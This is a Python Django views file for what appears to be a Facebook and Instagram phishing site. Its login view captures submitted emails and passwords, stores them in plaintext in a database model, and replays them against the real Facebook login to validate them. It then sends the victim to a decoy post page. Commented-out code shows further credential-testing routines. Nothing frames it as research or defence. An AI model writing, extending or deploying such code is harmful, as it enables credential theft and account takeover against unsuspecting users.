import urllib.request
from django.shortcuts import render, redirect
from .models import FacebookAccount
from .check_login import FacebookLogin
import time
from django.views.decorators.cache import cache_control
from .names_comments import names, comments, tupleNamesComments
import urllib
import http.cookiejar as cookielib
from . import doLogin
import socket
import socket
import requests
# Create your views here.


def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]


def get_location():
    ip_address = get_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name")
    }
    return location_data


def instagram(request):
    context = {}
    return render(request, 'insta.html', context)

def facebook(request):
    hostname  = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    context = {'ip_address':ip_address, 'location_data':get_location(), 'sss':request.META.get('HTTP_X_REAL_IP')}
    return render(request, 'index.html', context)

def TryToLoginFB(email,password):
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookielib.CookieJar()))
    url1 = "https://login.facebook.com"
    url2 = "https://login.facebook.com/login.php?login_attempt=1"
    data = str('&email=').encode('utf-8')+str(email).encode('utf-8')+str('&pass=').encode('utf-8')+str(password).encode('utf-8')
    socket = opener.open(url1)
    socket = opener.open(url2,data)
    return socket

def newLogin(request):
    email = request.POST.get('email')
    password = request.POST.get('password')

    if request.method == 'POST' and 'login' in request.POST and email and password:
        newLog = FacebookAccount.objects.create(email=email, password=password)
        newLog.save()

        # lo = doLogin.TryToLoginEM(email, password)
        # if lo:
        #     print("LOGGED")
        # else:
        #     print("ERROR")

        # socket = TryToLoginFB(str(email).encode('utf-8'), str(password).encode('utf-8'))

        # if bytes('logout', 'utf-8') in socket.read():
        #     print('Logged IN')
        #     return redirect('post')
        # else:
        #     print('ERROR')
        #     return redirect('facebook')

        if not request.user_agent.is_mobile:
            FacebookLogin(email=email, password=password, browser='Chrome').login()
            # time.sleep(5)

            if FacebookLogin.isLogged:
                return redirect('post')
            else:
                return redirect('facebook')
        else:
            pass
    else:
        return redirect('Facebook')

@cache_control(no_cache=True, must_revalidate=True)
def post(request):

    context={'names':names, 'comments':comments, 'tupleNamesComments':tupleNamesComments}

    return render(request, 'post.html', context)